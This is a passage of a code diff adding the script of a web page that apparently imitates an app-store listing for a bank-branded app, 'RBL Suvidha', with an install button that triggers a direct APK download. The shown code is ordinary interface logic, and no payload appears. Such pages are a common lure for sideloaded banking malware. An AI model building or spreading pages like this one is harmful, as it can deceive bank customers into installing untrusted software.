+            const wishlistBtn = document.getElementById('wishlistBtn');
+            const heartSpan = wishlistBtn.querySelector('span');
+
+            wishlistBtn.style.transform = 'scale(0.95)';
+            setTimeout(() => {
+                wishlistBtn.style.transform = 'scale(1)';
+            }, 150);
+
+            if (wishlistBtn.textContent.includes('Add to wishlist')) {
+                wishlistBtn.innerHTML = '<span>❤️</span> Added to wishlist';
+                wishlistBtn.style.color = '#ea4335';
+                heartSpan.style.color = '#ea4335';
+                showToast('💝 Added to wishlist!', 'success');
+
+                // Store in memory (since we can't use localStorage)
+                window.wishlistStatus = true;
+            } else {
+                wishlistBtn.innerHTML = '<span>🤍</span> Add to wishlist';
+                wishlistBtn.style.color = '#01875f';
+                showToast('💔 Removed from wishlist', 'info');
+
+                window.wishlistStatus = false;
+            }
+        }
+
+        // Tab switching with smooth transitions
+        function initializeTabSwitching() {
+            document.querySelectorAll('.category-tab').forEach(tab => {
+                tab.addEventListener('click', (e) => {
+                    e.preventDefault();
+
+                    // Remove active class from all tabs
+                    document.querySelectorAll('.category-tab').forEach(t => {
+                        t.classList.remove('active');
+                        t.style.transform = 'scale(1)';
+                    });
+
+                    // Add active class to clicked tab
+                    tab.classList.add('active');
+                    tab.style.transform = 'scale(1.05)';
+
+                    setTimeout(() => {
+                        tab.style.transform = 'scale(1)';
+                    }, 200);
+
+                    showToast(`📂 Switched to ${tab.textContent}`, 'info');
+                });
+            });
+        }
+
+        // Analytics tracking
+        function trackDownload(filename, size) {
+            const eventData = {
+                event: 'app_download',
+                app_name: 'RBL Suvidha',
+                file_name: filename,
+                file_size: size,
+                timestamp: new Date().toISOString(),
+                user_agent: navigator.userAgent,
+                platform: navigator.platform
+            };
+
+            console.log('Download tracked:', eventData);
+
+            // Here you would typically send to analytics service
+            // Example: gtag, mixpanel, or custom analytics
+        }
+
+        // Keyboard navigation enhancement
+        function initializeKeyboardNavigation() {
+            document.addEventListener('keydown', (e) => {
+                const focused = document.activeElement;
+
+                switch (e.key) {
+                    case 'Enter':
+                    case ' ':
+                        if (focused.classList.contains('install-btn')) {
+                            e.preventDefault();
+                            downloadAPK();
+                        } else if (focused.classList.contains('screenshot')) {
+                            e.preventDefault();
+                            focused.click();
+                        }
+                        break;
+
+                    case 'ArrowLeft':
+                        if (focused.classList.contains('screenshot')) {
+                            e.preventDefault();
+                            const prev = focused.previousElementSibling;
+                            if (prev && prev.classList.contains('screenshot')) {
+                                prev.focus();
+                            }
+                        }
+                        break;
+
+                    case 'ArrowRight':
+                        if (focused.classList.contains('screenshot')) {
+                            e.preventDefault();
+                            const next = focused.nextElementSibling;
+                            if (next && next.classList.contains('screenshot')) {
+                                next.focus();
+                            }
+                        }
+                        break;
+
+                    case 'Escape':
+                        if (document.querySelector('.toast.show')) {
+                            document.querySelector('.toast.show').classList.remove('show');
+                        }
+                        break;
+                }
+            });
+        }
+
+        // Network status monitoring
+        function initializeNetworkMonitoring() {
+            function updateOnlineStatus() {
+                if (navigator.onLine) {
+                    showToast('🌐 Connection restored', 'success');
+                } else {
+                    showToast('📡 You are offline. Download may not work.', 'warning');
+                }
+            }
+
+            window.addEventListener('online', updateOnlineStatus);
+            window.addEventListener('offline', updateOnlineStatus);
+        }
+
+        // Performance monitoring
+        function initializePerformanceMonitoring() {
+            // Monitor page load performance
+            window.addEventListener('load', () => {
+                if ('performance' in window) {
+                    const perfData = performance.getEntriesByType('navigation')[0];
+                    const loadTime = perfData.loadEventEnd - perfData.fetchStart;
+
+                    if (loadTime > 3000) {
+                        console.warn('Slow page load detected:', loadTime + 'ms');
+                    }
+                }
+            });
+
+            // Monitor memory usage (if available)
+            if ('memory' in performance) {
+                setInterval(() => {
+                    const memory = performance.memory;
+                    if (memory.usedJSHeapSize > memory.jsHeapSizeLimit * 0.9) {
+                        console.warn('High memory usage detected');
+                    }
+                }, 30000);
+            }
+        }
+
+        // Initialize application
+        document.addEventListener('DOMContentLoaded', function () {
+            // Core initialization
+            performSecurityCheck();
+            initializeScreenshotScroll();
+            initializeTabSwitching();
+            initializeKeyboardNavigation();
+            initializeNetworkMonitoring();
+            initializePerformanceMonitoring();
+
+            // Event listeners
+            document.getElementById('installBtn').addEventListener('click', downloadAPK);
+            document.getElementById('shareBtn').addEventListener('click', handleShare);
+            document.getElementById('wishlistBtn').addEventListener('click', handleWishlist);
+
+            // Initialize interactive elements
+            document.querySelectorAll('.see-details, .arrow-right').forEach(element => {
+                element.addEventListener('click', (e) => {
+                    e.preventDefault();
+                    element.style.transform = 'scale(0.95)';
+                    setTimeout(() => {
+                        element.style.transform = 'scale(1)';
+                    }, 150);
+                    showToast('🔍 Feature coming soon!', 'info');
+                });
+            });
+
+            // Rating bars animation
+            setTimeout(() => {
+                document.querySelectorAll('.bar-progress').forEach(bar => {
+                    const width = bar.style.width;
+                    bar.style.width = '0%';
+                    setTimeout(() => {
+                        bar.style.width = width;
+                    }, 500);
+                });
+            }, 1000);
+
+            // Show welcome message
+            setTimeout(() => {
+                showToast('👋 Welcome to RBL Suvidha download page!', 'success');
+            }, 1500);
+
+            console.log('RBL Suvidha download page initialized successfully');
+        });
+
+        // Global error handling
+        window.addEventListener('error', (e) => {
+            console.error('Global error:', e.error);
+            showToast('⚠️ An error occurred. Please refresh and try again.', 'error');
+        });
+
+        window.addEventListener('unhandledrejection', (e) => {
+            console.error('Unhandled promise rejection:', e.reason);
+            showToast('⚠️ Network error occurred. Please check your connection.', 'error');
+        });
+    </script>
+</body>
+
+</html>
